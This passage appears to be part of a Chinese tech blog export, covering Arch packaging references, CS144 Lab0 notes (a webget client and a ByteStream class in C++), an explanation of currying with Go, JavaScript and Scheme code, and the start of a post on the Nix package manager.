<h2 id="参考和推荐阅读"><a href="#参考和推荐阅读" class="headerlink" title="参考和推荐阅读"></a>参考和推荐阅读</h2><p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RldmVsb3Blcldpa2k6SW5kZXg=">DeveloperWiki<i class="fa fa-external-link-alt"></i></span> 里面关于打包的部分可以看看<br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0FyY2hfcGFja2FnZV9ndWlkZWxpbmVz">Arch package guidelines<i class="fa fa-external-link-alt"></i></span> Arch官方的打包指南<br>[PKGBUILD_(简体中文)]<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1BLR0JVSUxEXyglRTclQUUlODAlRTQlQkQlOTMlRTQlQjglQUQlRTYlOTYlODcp">https://wiki.archlinux.org/index.php/PKGBUILD_(简体中文)<i class="fa fa-external-link-alt"></i></span> PKGBUILD的简要介绍<br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL01ha2Vwa2dfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Makepkg_(简体中文)<i class="fa fa-external-link-alt"></i></span> Makepkg也比较重要，有需要可以参考维基修改一下参数<br><span class="exturl" data-url="aHR0cHM6Ly9mZWxpeGMuYXQvMjAxNy8wOC9tYWtlLWFuLWFyY2gtcGFja2FnZS1mb3ItcHl0aG9uLW1vZHVsZS8=">给 Arch 打一个包 – Python 模块篇<i class="fa fa-external-link-alt"></i></span> python的包经常没什么人愿意打（确实依赖比较麻烦，好在有肥猫，打了一大堆python包），希望多来点熟悉python的大佬<br><span class="exturl" data-url="aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy9tYW4vUEtHQlVJTEQuNQ==">PKGBUILD参考手册<i class="fa fa-external-link-alt"></i></span> Arch官网的参考手册，话说Arch最近新上的<span class="exturl" data-url="aHR0cHM6Ly9tYW4uYXJjaGxpbnV4Lm9yZy8=">手册索引<i class="fa fa-external-link-alt"></i></span>挺香的（btw I use tldr）<br><span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsdHIuY29tL2RvY3MvYnVpbGRpbmctcGFja2FnZXMtb24tYXJjaC1saW51eA==">Building Packages on Arch Linux (Including the AUR)<i class="fa fa-external-link-alt"></i></span> Vultr的教程（我也不知道Vultr怎么会有这种东西）<br><span class="exturl" data-url="aHR0cHM6Ly9qdW55dXNzaC5naXRodWIuaW8vcC9hcmNoLWxpbnV4LXBhY2thZ2UtcXVpY2stc3RhcnQv">Arch Linux 第一次打包就上手<i class="fa fa-external-link-alt"></i></span>  新手可以看看这个<br><span class="exturl" data-url="aHR0cHM6Ly9zbGVlcG1hcC5kZS8yMDIyL3BhY2thZ2luZy1mb3ItYXJjaC1saW51eC8=">Packaging for Arch Linux<i class="fa fa-external-link-alt"></i></span>  一个TU写的</p>
<h3 id="其他的一些打包的阅读资料"><a href="#其他的一些打包的阅读资料" class="headerlink" title="其他的一些打包的阅读资料"></a>其他的一些打包的阅读资料</h3><p>下面这些和AUR关系不是很大，闲着没事可以看着玩</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzM1OTA3MC8=">FatELF: universal binaries for Linux<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>AUR</tag>
        <tag>Archlinux</tag>
      </tags>
  </entry>
  <entry>
    <title>CS144 Lab0 笔记：环境配置和热身</title>
    <url>/cs144-note/</url>
    <content><![CDATA[<p>写习惯了go之后c&#x2F;cpp水平直线下滑，每三行都有一行忘了加分号。麻了，全靠clang-tidy和报错clang报错救我狗命</p>
<span id="more"></span>

<h2 id="关于cs144"><a href="#关于cs144" class="headerlink" title="关于cs144"></a>关于cs144</h2><p>cs144的Lab是实现一个TCP协议栈，可惜是用C++写的，而且那个代码风格我也不怎么喜欢。我C++水平很菜，基本写东西都是C with Class 风格的。而且我不怎么喜欢 Modern C++， 所以不会按照Lab的要求（比如用迭代器代替循环、不使用malloc&#x2F;free之类的东西、使用智能指针等）</p>
<h3 id="做了几个Lab之后的更新"><a href="#做了几个Lab之后的更新" class="headerlink" title="做了几个Lab之后的更新"></a>做了几个Lab之后的更新</h3><p>做了三个Lab了回来说一下，这个课程的讲解和Lab的参考材料非常不详细，不像6.S081那样有不少Hints，各种讲解和助教的大作业FAQ什么的也把容易踩坑的地方都提到了。于是CS144的Lab做起来就很麻，颇有一种<code>fly bitch!</code>的感觉。</p>
<p><img src="/cs144-note/1652191785.png"></p>
<p>我做这个东西人麻了的程度甚至比6.824那一堆race条件debug找不出来还要麻。6.824实现Raft好好看论文和资料，大概知道Raft的状态转移和实现思路，剩下的是漫长的debug和race条件抓虫。这个不一样，这个好多思路和细节Lab根本不告诉你，然后实现的时候脑子是懵的，经常不知道干嘛，完全没有思路。然后翻了半天《TCP&#x2F;IP详解：卷2》，然后各种乱找资料</p>
<p>而且golang我用的比c++，尤其是modern c++熟太多了。然后这个Lab的各种命名也不像xv6那种unix和POSIX风格的精简</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Archlinux下装这些包很简单，直接把<span class="exturl" data-url="aHR0cHM6Ly9zdGFuZm9yZC5lZHUvY2xhc3MvY3MxNDQvdm1faG93dG8vdm0taG93dG8tYnlvLmh0bWw=">BYO Linux installation<i class="fa fa-external-link-alt"></i></span> 列出来的包用pacman装一遍就好了</p>
<p>需要注意的是NetworkManger要配置一下忽略实验用的虚拟设备。</p>
<h2 id="Lab-0"><a href="#Lab-0" class="headerlink" title="Lab 0"></a>Lab 0</h2><p>前面几个Lab是用一下telnet和nc玩，跳过（nc用的不多，我还是习惯nmap）</p>
<h3 id="webget"><a href="#webget" class="headerlink" title="webget"></a>webget</h3><p>准备环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cs144/sponge </span><br><span class="line"><span class="built_in">cd</span> sponge</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line"><span class="comment"># 我比较喜欢用clang，报错比较舒服</span></span><br><span class="line">CC=clang CXX=clang++ cmake ..</span><br><span class="line">make -j12</span><br></pre></td></tr></table></figure>

<p>这个很简单，直接照着<code>TCPSocket</code>的文档改就可以了， 见 <span class="exturl" data-url="aHR0cHM6Ly9jczE0NC5naXRodWIuaW8vZG9jL2xhYjAvY2xhc3NfdF9jX3Bfc29ja2V0Lmh0bWw=">https://cs144.github.io/doc/lab0/class_t_c_p_socket.html<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_URL</span><span class="params">(<span class="type">const</span> string &amp;host, <span class="type">const</span> string &amp;path)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line">    TCPSocket sock1&#123;&#125;;</span><br><span class="line">    sock1.<span class="built_in">connect</span>(<span class="built_in">Address</span>(host, <span class="string">&quot;http&quot;</span>));</span><br><span class="line">    sock1.<span class="built_in">write</span>(<span class="string">&quot;GET &quot;</span> + path + <span class="string">&quot; HTTP/1.1\r\nHost: &quot;</span> + host + <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">    sock1.<span class="built_in">shutdown</span>(SHUT_WR);</span><br><span class="line">    <span class="keyword">while</span> (!sock1.<span class="built_in">eof</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; sock1.<span class="built_in">read</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    sock1.<span class="built_in">close</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编译并测试</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make webget</span><br><span class="line">make check_webget</span><br></pre></td></tr></table></figure>

<h3 id="An-in-memory-reliable-byte-stream"><a href="#An-in-memory-reliable-byte-stream" class="headerlink" title="An in-memory reliable byte stream"></a>An in-memory reliable byte stream</h3><p>实现一个内存中有序的字节流。这个算是开胃菜，TCP是在不可靠的网络下实现有序的字节流。这里不要求并发和加锁，所以只要一个非常简单的队列+buffer缓冲就可以了。</p>
<blockquote>
<p>Your byte stream is for use in a single thread—you don’t have to worry about concurrent writers&#x2F;readers, locking, or race conditions.</p>
</blockquote>
<p>看到这句话之前我还以为这个Lab要折腾menory barrier那些东西，这样就好办了。</p>
<p>第一反应是整一个像kqueue那样的循环队列，可是这个Lab的C++风格他不让我用指针，习惯了c风格好难受。算了算了上stl吧。字节流那就直接用队列吧。然后这个类里面再加上是容量（capacity），写入字节，读取字节、是否结束，就差不多了。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ByteStream</span> &#123;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// Your code here -- add private members as necessary.</span></span><br><span class="line">    std::deque&lt;<span class="type">char</span>&gt; _buffer;</span><br><span class="line">    <span class="type">size_t</span> _capacity;</span><br><span class="line">    <span class="type">bool</span> _input_end;</span><br><span class="line">    <span class="type">size_t</span> _byte_written;</span><br><span class="line">    <span class="type">size_t</span> _byte_read;</span><br></pre></td></tr></table></figure>

<p>然后我们分别实现这几个类的方法，write好办，注意一下长度就行了。这里要求编码规范是Modern C++, 但是我Modern C++ 不熟，也没怎么用迭代器，蠢蠢的扔了好多for循环之类的东西</p>
<p>write就是一个简单的队尾出队，然后<code>_byte_written</code>计数增加</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::write</span><span class="params">(<span class="type">const</span> string &amp;data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_input_end == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> _data_length = data.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span> (_data_length + _buffer.<span class="built_in">size</span>() &gt; _capacity) &#123;</span><br><span class="line">        _data_length = _capacity - _buffer.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    _byte_written += _data_length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; _data_length; i++) &#123;</span><br><span class="line">        _buffer.<span class="built_in">push_back</span>(data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> _data_length;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>peek好办，直接拼成字符串就行了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// peek的时候输出是一个string</span></span><br><span class="line"><span class="comment">//! \param[in] len bytes will be copied from the output side of the buffer</span></span><br><span class="line"><span class="function">string <span class="title">ByteStream::peek_output</span><span class="params">(<span class="type">const</span> <span class="type">size_t</span> len)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> _length = len;</span><br><span class="line">    <span class="keyword">if</span> (_length &gt; _buffer.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        _length = _buffer.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">str</span><span class="params">(_buffer.begin(), _buffer.begin() + _length)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>pop_output</code>也简单，注意一下长度然后从队列头部pop就好了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// buffer里面弹出长度为len的字节，需要考虑len &gt; _buffer.size()的情况</span></span><br><span class="line"><span class="comment">//! \param[in] len bytes will be removed from the output side of the buffer</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ByteStream::pop_output</span><span class="params">(<span class="type">const</span> <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> _data_length = len;</span><br><span class="line">    <span class="keyword">if</span> (_data_length &gt; _buffer.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        _data_length = _buffer.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; _data_length; i++) &#123;</span><br><span class="line">        _buffer.<span class="built_in">pop_front</span>();</span><br><span class="line">        _byte_read++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后read就是先<code>peek_output</code>再<code>pop_output</code>，</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 写端的read，注意需要pop_ouput, 读出来之后需要pop的</span></span><br><span class="line"><span class="function">std::string <span class="title">ByteStream::read</span><span class="params">(<span class="type">const</span> <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    string output = <span class="built_in">peek_output</span>(len);</span><br><span class="line">    <span class="built_in">pop_output</span>(len);</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后这一堆方法就直接返回相应的值就好了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ByteStream::end_input</span><span class="params">()</span> </span>&#123; _input_end = <span class="literal">true</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ByteStream::input_ended</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _input_end; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::buffer_size</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _buffer.<span class="built_in">size</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ByteStream::buffer_empty</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _buffer.<span class="built_in">empty</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ByteStream::eof</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _input_end; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::bytes_written</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _byte_written; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::bytes_read</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _byte_read; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">ByteStream::remaining_capacity</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _capacity - _buffer.<span class="built_in">size</span>(); &#125;</span><br></pre></td></tr></table></figure>

<p>emmmmm, 然后<code>make check_lab0</code>有两个test没过，看一下报错<code>Failure message:        The ByteStream should have had eof equal to 0 but instead it was 1</code></p>
<p>哦，忘了设置EOF了。不对我设了，那是哪出问题了。。。找了五分钟发现EOF要加上队列empty的条件，我是傻逼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ByteStream::eof</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> _input_end &amp;&amp; <span class="built_in">buffer_empty</span>(); &#125;</span><br></pre></td></tr></table></figure>

<p>这样测试就过了</p>
<h2 id="链接和参考材料"><a href="#链接和参考材料" class="headerlink" title="链接和参考材料"></a>链接和参考材料</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jczE0NC5naXRodWIuaW8v">https://cs144.github.io/<i class="fa fa-external-link-alt"></i></span> 课程主页<br>还有视频录像不过我不喜欢看视频，没看，直接上的Lab<br>《TCP&#x2F;IP详解 卷2》 这个有不少实现的细节, Lab讲的不详细我基本上都是跑到这里面翻的<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z6eXo5OTkvQW5hbHlzaXNfVENQX2luX0xpbnV4">Linux 4.4.0内核源码分析——TCP实现<i class="fa fa-external-link-alt"></i></span> 太感动了这个资料，注释极为详细（不过linux协议栈的实现很复杂，适合没思路的时候偶尔翻翻找找灵感，这个Lab的实现一般都很Naive，差别很大不适合照抄）  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbWluaWlyL2xldmVsLWlw">level-ip<i class="fa fa-external-link-alt"></i></span> 一个用户态玩具TCP&#x2F;IP协议栈，c写的<br>我最开始先看的这个，对TCP&#x2F;IP协议栈有个大概的概念，感觉这个看过一遍有了点头绪，CS144的Lab指导看完对整个TCP&#x2F;IP协议栈是啥样的没啥头绪<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtaW5paXIuY29tL2xldHMtY29kZS10Y3AtaXAtc3RhY2stMS1ldGhlcm5ldC1hcnAv">Let’s code a TCP&#x2F;IP stack, 1: Ethernet &amp; ARP<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtaW5paXIuY29tL2xldHMtY29kZS10Y3AtaXAtc3RhY2stMi1pcHY0LWljbXB2NC8=">Let’s code a TCP&#x2F;IP stack, 2: IPv4 &amp; ICMPv4<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtaW5paXIuY29tL2xldHMtY29kZS10Y3AtaXAtc3RhY2stMy10Y3AtaGFuZHNoYWtlLw==">Let’s code a TCP&#x2F;IP stack, 3: TCP Basics &amp; Handshake<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtaW5paXIuY29tL2xldHMtY29kZS10Y3AtaXAtc3RhY2stNC10Y3AtZGF0YS1mbG93LXNvY2tldC1hcGkv">Let’s code a TCP&#x2F;IP stack, 4: TCP Data Flow &amp; Socket API<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuc2FtaW5paXIuY29tL2xldHMtY29kZS10Y3AtaXAtc3RhY2stNS10Y3AtcmV0cmFuc21pc3Npb24v">Let’s code a TCP&#x2F;IP stack, 5: TCP Retransmission<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yZmMuZnlpLw==">rfc.fyi<i class="fa fa-external-link-alt"></i></span> RFC标准速查表  </p>
<p>然后是对写这门课的Lab可能帮助不是特别大的书和资料(资料本身其实都还不错)</p>
<p>《TCP&#x2F;IP详解 卷1》 这个主要讲概念，看完一遍之后还是不知道怎么实现，如果是为了做Lab找资料推荐直接翻卷2<br>《计算机网络: 自顶向下方法》这个书好是好，但是讲的太简略了，看完想实现没啥头绪，还得去TCP&#x2F;IP协议卷2翻细节，这本书的协议栈实现讲的是<code>4.4BSD-Lite</code>，<br>《深入理解LINUX网络技术内幕》大量的章节都在讲网络驱动，和这门课的Lab的TCP协议栈的内容关系不是特别大<br>《Effective Modern C++ 中文版》 这本书我研一买的，彩色印刷，包装很烂。我当时就想看看modern c++，然后看到一半彻底对C++喜欢不起来了。当时我唯一的想法就是不要把有限的生命浪费在一个充斥着语言律师的语言上。那个时候还在看《The Little Schemer》，看那些优雅连贯的递归的奇妙感觉，和同时在看的c++的繁杂形成了鲜明的对比。也是在那会，被C++坑的多了突然喜欢上go了。  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBhY2thZ2VjbG91ZC5pby9lbmcvMjAxNy8wMi8wNi9tb25pdG9yaW5nLXR1bmluZy1saW51eC1uZXR3b3JraW5nLXN0YWNrLXNlbmRpbmctZGF0YQ==">Monitoring and Tuning the Linux Networking Stack: Sending Data<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBhY2thZ2VjbG91ZC5pby9lbmcvMjAxNi8wNi8yMi9tb25pdG9yaW5nLXR1bmluZy1saW51eC1uZXR3b3JraW5nLXN0YWNrLXJlY2VpdmluZy1kYXRhLw==">Monitoring and Tuning the Linux Networking Stack: Receiving Data<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL2FydGh1cmNoaWFvLmFydC9ibG9nL3R1bmluZy1zdGFjay10eC16aC8=">[译] Linux 网络栈监控和调优：发送数据（2017）<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL2FydGh1cmNoaWFvLmFydC9ibG9nL3R1bmluZy1zdGFjay1yeC16aC8=">[译] Linux 网络栈监控和调优：接收数据（2016）<i class="fa fa-external-link-alt"></i></span>  这两篇文章适合做完Lab再看，很容易迷失在细节里面  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucmZjLWVkaXRvci5vcmcvcmZjL3JmYzExODAudHh0">A TCP&#x2F;IP Tutorial<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL2FydGh1cmNoaWFvLmFydC9ibG9nL3JmYzExODAtYS10Y3AtaXAtdHV0b3JpYWwtemgv">[译] RFC 1180：朴素 TCP&#x2F;IP 教程（1991）<i class="fa fa-external-link-alt"></i></span><br>我一开始还以为是实现一个TCP协议栈的，点开才发现很老的一个简短介绍，大概相当于TCP&#x2F;IP卷1的太长不看版。其实讲的还可以，没有一点废话，不过对Lab没啥帮助。</p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy41MmltLm5ldC90aHJlYWQtMTAwMy0xLTEuaHRtbA==">不为人知的网络编程(一)：浅析TCP协议中的疑难杂症(上篇)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy41MmltLm5ldC90aHJlYWQtMTAwNC0xLTEuaHRtbA==">不为人知的网络编程(二)：浅析TCP协议中的疑难杂症(下篇)<i class="fa fa-external-link-alt"></i></span> 做Lab4的时候搜资料看到的，解决了我对TCP的一点疑惑  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>network</tag>
        <tag>cs144</tag>
      </tags>
  </entry>
  <entry>
    <title>关于柯里化</title>
    <url>/currying/</url>
    <content><![CDATA[<p>柯里化（Currying）把接受多个参数的函数变成单个参数的函数</p>
<span id="more"></span>

<p>比如我们有一个sum函数，接受三个参数</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(x, y, z <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y + z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>改成接受单个变量</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">curryingSum</span><span class="params">(x <span class="type">int</span>)</span></span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(z <span class="type">int</span>)</span></span> <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(y <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> x + y + z</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是调用起来就从f(x, y, z)变为f(x)(y)(z)</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">curryingSum(<span class="number">1</span>)(<span class="number">2</span>)(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>这样看起来性质很良好，只接受一个参数，返回一个输出。直觉告诉我们，接收单个变量的函数，比接收多个变量的函数有一些更加良好的性质。</p>
<p>但是go的curringSum函数要写返回值类型，看起来比较难受，用js来一版</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> curryingAdd = <span class="keyword">function</span>(<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">y</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">z</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> x + y + z</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>scheme版本的看起来也跟js差不多</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">(<span class="name"><span class="built_in">define</span></span> (<span class="name">currySum</span> f)</span><br><span class="line">    (<span class="name"><span class="built_in">lambda</span></span>(x)</span><br><span class="line">        (<span class="name">labmda</span>(<span class="name">y</span>)</span><br><span class="line">            (<span class="name"><span class="built_in">lambda</span></span>(z)</span><br><span class="line">                (<span class="name">f</span> x y z)))))</span><br></pre></td></tr></table></figure>

<p>对n个变量的Curry函数很容易实现</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">(<span class="name">define</span>  (<span class="name">curry</span> n f)  </span><br><span class="line"> (<span class="name">if</span> (<span class="name">=</span> n <span class="number">1</span>) f</span><br><span class="line">  (<span class="name">curry</span> </span><br><span class="line">    (<span class="name">-</span> n <span class="number">1</span>) </span><br><span class="line">    (<span class="name">lambda</span> s (<span class="name">lambda</span>  (<span class="name">a</span>) (<span class="name">apply</span> f (<span class="name">append</span> s (<span class="name">list</span> a))))))))</span><br></pre></td></tr></table></figure>

<p>js版本：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">curry</span>(<span class="params">fn</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> args = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> innerArgs = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">arguments</span>);</span><br><span class="line">        <span class="keyword">var</span> finalArgs = args.<span class="title function_">concat</span>(innerArgs);</span><br><span class="line">        <span class="keyword">return</span> fn.<span class="title function_">apply</span>(<span class="literal">null</span>, finalArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>类似的，我们可以实现反柯里化，说明多变量函数和单变量单返回函数可以相互转换</p>
<figure class="highlight scheme"><table><tr><td class="code"><pre><span class="line">(<span class="name"><span class="built_in">define</span></span> ((<span class="name">uncurry</span> f) . t)</span><br><span class="line">  (<span class="name"><span class="built_in">if</span></span> (<span class="name"><span class="built_in">null?</span></span> t)</span><br><span class="line">      f</span><br><span class="line">      (<span class="name"><span class="built_in">apply</span></span> (<span class="name">uncurry</span> (<span class="name">f</span> (<span class="name"><span class="built_in">car</span></span> t)))</span><br><span class="line">             (<span class="name"><span class="built_in">cdr</span></span> t))))</span><br></pre></td></tr></table></figure>

<p>那柯里化有什么用呢，可以用来实现多参数函数。（lambda演算是匿名的，并且只接收一个输入）在$\lambda$演算中，柯里化做了这样一个事情:</p>
<p>$$<br>\lambda x.(\lambda y.xy) &#x3D; \lambda x.(\lambda y. xy)<br>$$</p>
<p>在手搓自制scheme中，我们已经实现了有一个接收一个输入、返回一个输出的函数，那么可以通过柯里化实现一个接收多参数的函数。</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTlGJUFGJUU5JTg3JThDJUU1JThDJTk2">柯里化<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTGFtYmRhX2NhbGN1bHVz">Lambda Calcus<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>currying</tag>
      </tags>
  </entry>
  <entry>
    <title>immutable思路面对依赖冲突：Nix包管理器</title>
    <url>/dependency-conflicts/</url>
    <content><![CDATA[<p>一直没有什么处理依赖问题的好思路，后知后觉发现Nix包管理器。要是当年我还沉迷lisp的时候真的注意到这个，说不定现在人已经跑到NixOS去了</p>
<span id="more"></span>

<p>大多数发行版的版本是几年或者几个月一个大版本，然后维护对应版本的依赖和软件（一般依赖不怎么大更新，打补丁）， 比如Ubuntu、红帽这些商业发行版，没什么大问题基本不怎么动。不过维护这么多版本需要耗费不少的精力，而且由于rpm和deb打包比较麻烦，包不太多。</p>
